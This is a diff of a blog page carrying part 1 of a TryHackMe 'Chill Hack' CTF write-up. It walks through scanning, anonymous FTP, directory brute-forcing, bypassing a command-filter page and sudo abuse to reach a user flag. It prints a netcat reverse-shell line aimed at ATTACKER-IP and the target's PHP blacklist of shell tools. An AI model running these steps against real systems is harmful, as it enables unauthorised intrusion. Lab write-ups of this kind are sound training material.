@@ -1,723 +1,106 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<link rel="preconnect" href="https://fonts.gstatic.com">
-<link href="https://fonts.googleapis.com/css2?family=Playfair+Display&display=swap" rel="stylesheet"> 
-<link rel="icon" href="/assets/images/favicon.ico">
-
-<title>TryHackMe: Chill Hack WriteUp - PART 1 | Seif-Allah's Blog</title>
-
-<!-- Begin Jekyll SEO tag v2.7.1 -->
-<title>TryHackMe: Chill Hack WriteUp - PART 1 | Seif-Allah’s Blog</title>
-<meta name="generator" content="Jekyll v4.2.0" />
-<meta property="og:title" content="TryHackMe: Chill Hack WriteUp - PART 1" />
-<meta name="author" content="Seif-Allah" />
-<meta property="og:locale" content="en_US" />
-<meta name="description" content="TryHackMe: WriteUp for the Chill Hack room (Level: Medium)" />
-<meta property="og:description" content="TryHackMe: WriteUp for the Chill Hack room (Level: Medium)" />
-<meta property="og:site_name" content="Seif-Allah’s Blog" />
-<meta property="og:image" content="/assets/images/writeups/thm/chillhack/chillhack.png" />
-<meta property="og:type" content="article" />
-<meta property="article:published_time" content="2020-12-18T00:00:00+01:00" />
-<meta name="twitter:card" content="summary_large_image" />
-<meta property="twitter:image" content="/assets/images/writeups/thm/chillhack/chillhack.png" />
-<meta property="twitter:title" content="TryHackMe: Chill Hack WriteUp - PART 1" />
-<script type="application/ld+json">
-{"@type":"BlogPosting","image":"/assets/images/writeups/thm/chillhack/chillhack.png","headline":"TryHackMe: Chill Hack WriteUp - PART 1","dateModified":"2020-12-18T00:00:00+01:00","url":"/THM-Chill-Hack/","datePublished":"2020-12-18T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"/THM-Chill-Hack/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/assets/images/cover.png"},"name":"Seif-Allah"},"author":{"@type":"Person","name":"Seif-Allah"},"description":"TryHackMe: WriteUp for the Chill Hack room (Level: Medium)","@context":"https://schema.org"}</script>
-<!-- End Jekyll SEO tag -->
-
-    
-<link href="/assets/css/prism.css" rel="stylesheet">
-
-<link href="/assets/css/theme.css" rel="stylesheet">
-
-<script src="/assets/js/jquery.min.js"></script>
-
-</head>
-
-
-
-
-<body>
-
-
-<!-- Begin Sidebar Navigation
-================================================== -->
-
-<div class="sidebar">    
-</div>   
-<div class="nav-icon">
-    <div class="hamburger-bar"></div>
-</div>
-<div id="blackover-nav" class="blackover"></div>
-<nav id="menu">
-    <ul>
-        <h3>Navigation</h3>
-        <li><a href="/">Home</a></li>
-        <li><a  href="/contact">Contact</a></li>
-        <li><a href="/categories#Python">Python</a></li>
-        <li><a href="/categories#Java">Java</a></li>
-        <li><a href="/categories#CTF-WriteUp">CTF-WriteUp</a></li>
-        <li><a href="/categories#Articles">Articles</a></li>
-        <li><a href="/categories#Networking">Networking</a></li>    
-        <li><a href="/categories#Databases">Databases</a></li>
-        <li><a href="/categories#Django">Django</a></li>     
-        <li><a href="/categories#Linux">Linux</a></li>     
-    </ul>   
-</nav>
-
-<script src="assets/js/lunr.js"></script>
-
-<style>
-    
-</style>
-
-<div class="wrap-search">
-    <div class="d-flex align-items-center ml-auto">
-        <i class="fas fa-search show-search"></i>
-        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
-            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Type and enter..."/>
-        </form>
-    </div>
-</div>
-
-<div id="lunrsearchresults">
-    <ul></ul>
-</div>
-
-<script src="assets/js/lunrsearchengine.js"></script>
-
-
-<!-- End Sidebar Navigation
-================================================== -->
-
-<div class="site-content ">
-
-<div class="container">
-
-    <!-- Site Logo/Name
-    ================================================== -->
-   
-    <a class="navbar-brand" href="/">
-        <img src="/assets/images/cover.png" alt="Seif-Allah's Blog">
-    </a>  
-   
-
-    <!-- Site Tag
-    ================================================== -->
-    
-
-    <!-- Content
-    ================================================== -->
-    <div class="main-content">
-        <div class="entry-header">
-    <!-- Post Title -->
-    <h1 class="posttitle">TryHackMe: Chill Hack WriteUp - PART 1</h1>
-    <!-- Author & Date  Box -->
-    
-    
-    <div class="d-flex align-items-center mt-4">
-        <div>
-            
-            <img class="author-thumb" src="https://www.gravatar.com/avatar/87daf283c8d29fa33059e59cf5d183bb?s=250&d=mm&r=x" alt="Seif-Allah">
-            
-        </div>            
-        <div>
-        Written by <a target="_blank" class="text-dark" href="seifallahhomrani1.social">Seif-Allah</a> on 
-        <span class="post-date"><time class="post-date" datetime="2020-12-18">18 Dec 2020</time></span>           
-        
-        </div>            
-    </div>
-    
-</div>
-
-<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
-
-
-<!-- Featured Image -->
-
-<div class="entry-featured-image">
-    
-    <img class="featured-image " src="//assets/images/writeups/thm/chillhack/chillhack.png" alt="TryHackMe: Chill Hack WriteUp - PART 1">
-    
-</div>
-
-
-<!-- Content -->
-<!-- Post, Page Content
-================================================== -->
-<div class="article-post">
-    <!-- Toc if any -->
-    
-    <!-- End Toc -->
-    <h3 id="enumeration">Enumeration</h3>
-<p>Classic Nmap scan :</p>
-<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+<!DOCTYPE html> <html lang="en-US"> <head prefix="og: http://ogp.me/ns#"> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="ie=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <meta name="mobile-web-app-capable" content="yes" /> <meta name="apple-mobile-web-app-capable" content="yes" /> <meta name="application-name" content="Seif-Allah's Blog" /> <meta name="apple-mobile-web-app-status-bar-style" content="#fff" /> <meta name="apple-mobile-web-app-title" content="Seif-Allah's Blog" /> <title> TryHackMe: Chill Hack WriteUp - PART 1 - Seif-Allah's Blog </title> <link rel="alternate" href="http://localhost:4000/THM-Chill-Hack/" hreflang="en-US" /> <link rel="canonical" href="http://localhost:4000/THM-Chill-Hack/" /> <meta name="description" content="TryHackMe: WriteUp for the Chill Hack room (Level: Medium)" /> <meta name="referrer" content="no-referrer-when-downgrade" /> <meta property="fb:app_id" content="" /> <meta property="og:site_name" content="TryHackMe: Chill Hack WriteUp - PART 1 | Seif-Allah Homrani" /> <meta property="og:title" content="TryHackMe: Chill Hack WriteUp - PART 1 | Seif-Allah Homrani" /> <meta property="og:type" content="website" /> <meta property="og:url" content="http://localhost:4000/THM-Chill-Hack/" /> <meta property="og:description" content="TryHackMe: WriteUp for the Chill Hack room (Level: Medium)" /> <meta property="og:image" content="http://localhost:4000/assets/images/writeups/thm/chillhack/chillhack.png" /> <meta property="og:image:width" content="640" /> <meta property="og:image:height" content="640" /> <meta name="twitter:card" content="summary" /> <meta name="twitter:title" content="TryHackMe: Chill Hack WriteUp - PART 1 | seifallah1" /> <meta name="twitter:url" content="http://localhost:4000/THM-Chill-Hack/" /> <meta name="twitter:site" content="@seifallah1" /> <meta name="twitter:creator" content="@seifallah1" /> <meta name="twitter:description" content="TryHackMe: WriteUp for the Chill Hack room (Level: Medium)" /> <meta name="twitter:image" content="http://localhost:4000/assets/images/writeups/thm/chillhack/chillhack.png" /> <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Seif-Allah's Blog" /> <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicons/apple-touch-icon.png" /> <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicons/favicon-32x32.png" /> <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicons/favicon-16x16.png" /> <link rel="manifest" href="/assets/favicons/site.webmanifest" /> <link rel="mask-icon" href="/assets/favicons/safari-pinned-tab.svg" color="#5bbad5" /> <meta name="apple-mobile-web-app-title" content="Jekyll Klise" /> <meta name="application-name" content="Jekyll Klise" /> <meta name="msapplication-TileColor" content="#da532c" /> <meta name="theme-color" content="#2c2c2c" /> <link rel="stylesheet" href="/assets/css/style.css" /> </head> <body data-theme="dark" class="notransition"> <script> const body = document.body; const data = body.getAttribute("data-theme"); const initTheme = (state) => { if (state === "dark") { body.setAttribute("data-theme", "dark"); } else if (state === "light") { body.removeAttribute("data-theme"); } else { localStorage.setItem("theme", data); } }; initTheme(localStorage.getItem("theme")); setTimeout(() => body.classList.remove("notransition"), 75); </script> <div class="navbar" role="navigation"> <nav class="menu"> <input type="checkbox" id="menu-trigger" class="menu-trigger" /> <label for="menu-trigger"> <span class="menu-icon"> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <path d="M64,384H448V341.33H64Zm0-106.67H448V234.67H64ZM64,128v42.67H448V128Z" /> </svg> </span> </label> <a id="mode"> <svg class="mode-sunny" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>LIGHT</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> <svg class="mode-moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 512 512" > <title>DARK</title> <line x1="256" y1="48" x2="256" y2="96" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="256" y1="416" x2="256" y2="464" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="108.92" x2="369.14" y2="142.86" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="369.14" x2="108.92" y2="403.08" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="464" y1="256" x2="416" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="96" y1="256" x2="48" y2="256" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="403.08" y1="403.08" x2="369.14" y2="369.14" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <line x1="142.86" y1="142.86" x2="108.92" y2="108.92" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> <circle cx="256" cy="256" r="80" style="stroke-linecap:round;stroke-miterlimit:10;stroke-width:32px" /> </svg> </a> <div class="trigger"> <div class="trigger-container"><a class="menu-link" href="/">home</a><a class="menu-link" href="/archive/">archive</a><a class="menu-link" href="/about/">about</a></div> </div> </nav> </div> <div class="wrapper post"> <main class="page-content" aria-label="Content"> <article itemscope itemtype="https://schema.org/BlogPosting"> <header class="header"> <div class="tags"> <span itemprop="keywords"> <a class="tag" href="/tags/#thm">THM</a>, <a class="tag" href="/tags/#tryhackme">TRYHACKME</a>, <a class="tag" href="/tags/#writeup">WRITEUP</a>, <a class="tag" href="/tags/#chill-hack">CHILL HACK</a>, <a class="tag" href="/tags/#medium">MEDIUM</a>, <a class="tag" href="/tags/#ctf">CTF</a> </span> </div> <h1 class="header-title" itemprop="headline">TryHackMe: Chill Hack WriteUp - PART 1</h1> <div class="post-meta"> <time datetime="2020-12-18T00:00:00+01:00" itemprop="datePublished"> Dec 18, 2020 </time> <span itemprop="author" itemscope itemtype="https://schema.org/Person"> <span itemprop="name">Seif-Allah Homrani</span> </span> <time hidden datetime="" itemprop="dateModified"> Dec 18, 2020 </time> <span hidden itemprop="publisher" itemtype="Person">Seif-Allah Homrani</span> <span hidden itemprop="image">/assets/images/writeups/thm/chillhack/chillhack.png</span> <span hidden itemprop="mainEntityOfPage"><h3 id="enumeration">Enumeration</h3> <p>Classic Nmap scan :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 | ssh-hostkey: 
-|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
-|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
-|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-</code></pre>
-<p>First things first, I start enumerating the FTP port wishing that it accepts anonymous login:</p>
-<pre><code class="language-bash">ftp 10.10.146.220
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</code></pre></div></div> <p>First things first, I start enumerating the FTP port wishing that it accepts anonymous login:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.146.220
 Connected to 10.10.146.220.
-220 (vsFTPd 3.0.3)
-Name (10.10.146.220:root): anonymous
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.146.220:root<span class="o">)</span>: anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
-Remote system type is UNIX.
+Remote system <span class="nb">type </span>is UNIX.
 Using binary mode to transfer files.
-ftp&gt; ls -al
-200 PORT command successful. Consider using PASV.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-al</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
 150 Here comes the directory listing.
-drwxr-xr-x    2 0        115          4096 Oct 03 04:33 .
+drwxr-xr-x    2 0        115          4096 Oct 03 04:33 <span class="nb">.</span>
 drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
--rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
+<span class="nt">-rw-r--r--</span>    1 1001     1001           90 Oct 03 04:33 note.txt
 226 Directory send OK.
 ftp&gt; get note.txt
-local: note.txt remote: note.txt
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for note.txt (90 bytes).
+<span class="nb">local</span>: note.txt remote: note.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>note.txt <span class="o">(</span>90 bytes<span class="o">)</span><span class="nb">.</span>
 226 Transfer complete.
-90 bytes received in 0.00 secs (703.1249 kB/s)
-</code></pre>
-<p>As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a <em>note.txt</em> file. 
-I download it using the <em>get</em> command.</p>
-
-<blockquote>
-  <p>Anurodh told me that there is some filtering on strings being put in the command – Apaar</p>
-</blockquote>
-
-<p>Well, that sounds cool, we got a hint, there’s some filtration out there for strings. (Hope that it’s not a rabbit hole), and we got 2 usernames. (We can start a bruteforce attack using hydra on the ssh but not for now, we need some more enumeration).</p>
-
-<p>Let’s move on for the HTTP server:
-<img src="/assets/images/writeups/thm/Chill hack/HTTP_server.png" alt="HTTP Server" />
-Nothing too fancy here, just some random theme running.</p>
-
-<p>So I ran <em>gobuster</em> for some directory searching.
-After some minutes of directory bruteforcing here’s the result :</p>
-<pre><code class="language-bash">root@kali:~/Documents/thm/game_info# gobuster dir -u http://10.10.146.220/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 200 2&gt;/dev/null 
-===============================================================
+90 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>703.1249 kB/s<span class="o">)</span>
+</code></pre></div></div> <p>As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a <em>note.txt</em> file. I download it using the <em>get</em> command.</p> </span> </div> </header> <div class="page-content" itemprop="articleBody"> <h3 id="enumeration"> <a href="#enumeration" class="anchor-head"></a> Enumeration </h3> <p>Classic Nmap scan :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</code></pre></div></div> <p>First things first, I start enumerating the FTP port wishing that it accepts anonymous login:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 10.10.146.220
+Connected to 10.10.146.220.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.146.220:root<span class="o">)</span>: anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls</span> <span class="nt">-al</span>
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        115          4096 Oct 03 04:33 <span class="nb">.</span>
+drwxr-xr-x    2 0        115          4096 Oct 03 04:33 ..
+<span class="nt">-rw-r--r--</span>    1 1001     1001           90 Oct 03 04:33 note.txt
+226 Directory send OK.
+ftp&gt; get note.txt
+<span class="nb">local</span>: note.txt remote: note.txt
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>note.txt <span class="o">(</span>90 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+90 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>703.1249 kB/s<span class="o">)</span>
+</code></pre></div></div> <p>As you can see,It accepts anonymous login, :WEEY: So I list all the files and it contains a <em>note.txt</em> file. I download it using the <em>get</em> command.</p> <blockquote> <p>Anurodh told me that there is some filtering on strings being put in the command – Apaar</p> </blockquote> <p>Well, that sounds cool, we got a hint, there’s some filtration out there for strings. (Hope that it’s not a rabbit hole), and we got 2 usernames. (We can start a bruteforce attack using hydra on the ssh but not for now, we need some more enumeration).</p> <p>Let’s move on for the HTTP server: <img src="/assets/images/writeups/thm/Chill hack/HTTP_server.png" alt="HTTP Server" /> Nothing too fancy here, just some random theme running.</p> <p>So I ran <em>gobuster</em> for some directory searching. After some minutes of directory bruteforcing here’s the result :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Documents/thm/game_info# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.146.220/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-t</span> 200 2&gt;/dev/null 
+<span class="o">===============================================================</span>
 Gobuster v3.0.1
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
-===============================================================
-[+] Url:            http://10.10.146.220/
-[+] Threads:        200
-[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Status codes:   200,204,301,302,307,401,403
-[+] User Agent:     gobuster/3.0.1
-[+] Timeout:        10s
-===============================================================
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.146.220/
+<span class="o">[</span>+] Threads:        200
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
 2020/12/18 07:29:47 Starting gobuster
-===============================================================
-/images (Status: 301)
-/css (Status: 301)
-/js (Status: 301)
-/fonts (Status: 301)
-/secret (Status: 301)
-</code></pre>
-<p>Well, as it’s in easy level, that was kinda expected.
-There’s a <em>/secret</em> directory. 
-Let’s check it inside our browser : 
-<img src="/assets/images/writeups/thm/chillhack/secret_directory.png" alt="/secret" />
-Hmm, a field expecting a command and an execute button, with a silly animation ! 
-Let’s execute an <em>ls</em> command and see what happens ? 
-<img src="/assets/images/writeups/thm/chillhack/hacker.png" alt="/hacker" />
-So, there’s some filtration for some commands like ls.
-I tried <em>cat</em>, <em>python</em> and <em>nc</em> commands but they’re all filtered. 
-I tried to split the commands with a semicolon but nothing changed. 
-So my final thought is that it filters some the string entered as an input.
-My first idea is to try a reverse shell found in <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">highon coffee blog</a> :</p>
-<pre><code class="language-bash">mkfifo /tmp/lol;nc ATTACKER-IP PORT 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
-</code></pre>
-<p><img src="/assets/images/writeups/thm/chillhack/reverse.png" alt="reverse" />
-Looking at the index.php file found in the /var/www/html/secret directory, I found that my guessing was true, there’s a blacklist array which contains some commands that are gonna filtered later.</p>
-<pre><code class="language-php">$cmd = $_POST['command'];
-$store = explode(" ",$cmd);
-$blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
-</code></pre>
-<p>Let’s spawn a tty shell and move on.
-Looking at the home directory, I found that there’s a directory called <em>apaar</em> (remember the hint ?).
-After checking it, I found a local.txt file which I don’t have permission to read and a .helpline.sh file which can be run as apaar (after checking <em>sudo -l</em>)</p>
-<pre><code class="language-bash">User www-data may run the following commands on ubuntu:
-    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
-</code></pre>
-<p>Reading the code, it looks like it executes whatever we type and redirects the error the /dev/null, so I executed <em>/bin/bash</em> to get a shell from the user <em>apaar</em> and run any command we want !</p>
-<pre><code class="language-bash">www-data@ubuntu:/home/apaar$ sudo -u apaar /home/apaar/.helpline.sh
-sudo -u apaar /home/apaar/.helpline.sh
+<span class="o">===============================================================</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/css <span class="o">(</span>Status: 301<span class="o">)</span>
+/js <span class="o">(</span>Status: 301<span class="o">)</span>
+/fonts <span class="o">(</span>Status: 301<span class="o">)</span>
+/secret <span class="o">(</span>Status: 301<span class="o">)</span>
+</code></pre></div></div> <p>Well, as it’s in easy level, that was kinda expected. There’s a <em>/secret</em> directory. Let’s check it inside our browser : <img src="/assets/images/writeups/thm/chillhack/secret_directory.png" alt="/secret" /> Hmm, a field expecting a command and an execute button, with a silly animation ! Let’s execute an <em>ls</em> command and see what happens ? <img src="/assets/images/writeups/thm/chillhack/hacker.png" alt="/hacker" /> So, there’s some filtration for some commands like ls. I tried <em>cat</em>, <em>python</em> and <em>nc</em> commands but they’re all filtered. I tried to split the commands with a semicolon but nothing changed. So my final thought is that it filters some the string entered as an input. My first idea is to try a reverse shell found in <a href="https://highon.coffee/blog/reverse-shell-cheat-sheet/">highon coffee blog</a> :</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkfifo</span> /tmp/lol<span class="p">;</span>nc ATTACKER-IP PORT 0&lt;/tmp/lol | /bin/sh <span class="nt">-i</span> 2&gt;&amp;1 | <span class="nb">tee</span> /tmp/lol
+</code></pre></div></div> <p><img src="/assets/images/writeups/thm/chillhack/reverse.png" alt="reverse" /> Looking at the index.php file found in the /var/www/html/secret directory, I found that my guessing was true, there’s a blacklist array which contains some commands that are gonna filtered later.</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'command'</span><span class="p">];</span>
+<span class="nv">$store</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">" "</span><span class="p">,</span><span class="nv">$cmd</span><span class="p">);</span>
+<span class="nv">$blacklist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'nc'</span><span class="p">,</span> <span class="s1">'python'</span><span class="p">,</span> <span class="s1">'bash'</span><span class="p">,</span><span class="s1">'php'</span><span class="p">,</span><span class="s1">'perl'</span><span class="p">,</span><span class="s1">'rm'</span><span class="p">,</span><span class="s1">'cat'</span><span class="p">,</span><span class="s1">'head'</span><span class="p">,</span><span class="s1">'tail'</span><span class="p">,</span><span class="s1">'python3'</span><span class="p">,</span><span class="s1">'more'</span><span class="p">,</span><span class="s1">'less'</span><span class="p">,</span><span class="s1">'sh'</span><span class="p">,</span><span class="s1">'ls'</span><span class="p">);</span>
+</code></pre></div></div> <p>Let’s spawn a tty shell and move on. Looking at the home directory, I found that there’s a directory called <em>apaar</em> (remember the hint ?). After checking it, I found a local.txt file which I don’t have permission to read and a .helpline.sh file which can be run as apaar (after checking <em>sudo -l</em>)</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>User www-data may run the following commands on ubuntu:
+    <span class="o">(</span>apaar : ALL<span class="o">)</span> NOPASSWD: /home/apaar/.helpline.sh
+</code></pre></div></div> <p>Reading the code, it looks like it executes whatever we type and redirects the error the /dev/null, so I executed <em>/bin/bash</em> to get a shell from the user <em>apaar</em> and run any command we want !</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/home/apaar<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> apaar /home/apaar/.helpline.sh
+<span class="nb">sudo</span> <span class="nt">-u</span> apaar /home/apaar/.helpline.sh
 
-Welcome to helpdesk. Feel free to talk to anyone at any time!
+Welcome to helpdesk. Feel free to talk to anyone at any <span class="nb">time</span><span class="o">!</span>
 
 Enter the person whom you want to talk with: seif
 seif
 Hello user! I am seif,  Please enter your message: /bin/bash
 /bin/bash
+<span class="nb">ls
 ls
-ls
-local.txt
+</span>local.txt
+<span class="nb">whoami
 whoami
-whoami
-apaar
-cat local.txt
-cat local.txt
-{USER-FLAG: REDACTED-REDACTED-REDACTED}
-</code></pre>
-<p>Bingo ! We got the first flag</p>
-
-</div>
-
-<!-- Rating -->
-
-
-<!-- Author Box if enabled from _config.yml -->
-<!-- Author Box -->
-
-
-
-
-<!-- Comments if not disabled with comments: false -->
-<!-- Comments
-================================================== -->
- 
-<div class="comments">
-    <button class="btn btn-dark show-comments">Load Comments</button>         
-    <div id="comments">  
-        <h4 class="mb-4">Comments</h4>                 
-            <section class="disqus">
-    <div id="disqus_thread"></div>
-    <script type="text/javascript">
-        var disqus_shortname = 'demowebsite'; 
-        var disqus_developer = 0;
-        (function() {
-            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
-            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-        })();
-    </script>
-    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-</section>
-     
-    <div class="clearfix"></div>              
-    </div>    
-</div>       
-
-
-<!-- Share -->
-<div class="share">
-    <p>
-        Share
-    </p>
-    <ul>
-        <li class="ml-1 mr-1">
-            <a target="_blank" href="https://twitter.com/intent/tweet?text=TryHackMe: Chill Hack WriteUp - PART 1&url=/THM-Chill-Hack/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
-                <i class="fab fa-twitter"></i>
-            </a>
-        </li>
-
-        <li class="ml-1 mr-1">
-            <a target="_blank" href="https://facebook.com/sharer.php?u=/THM-Chill-Hack/" onclick="window.open(this.href, 'facebook-share', 'width=550,height=435');return false;">
-                <i class="fab fa-facebook-f"></i>
-            </a>
-        </li>
-
-        <li class="ml-1 mr-1">
-            <a target="_blank" href="https://www.linkedin.com/shareArticle?mini=true&url=/THM-Chill-Hack/" onclick="window.open(this.href, 'width=550,height=435');return false;">
-                <i class="fab fa-linkedin-in"></i>
-            </a>
-        </li>
-
-    </ul>
-</div>
-
-
-<!-- Related Post -->
-<!-- Related Posts
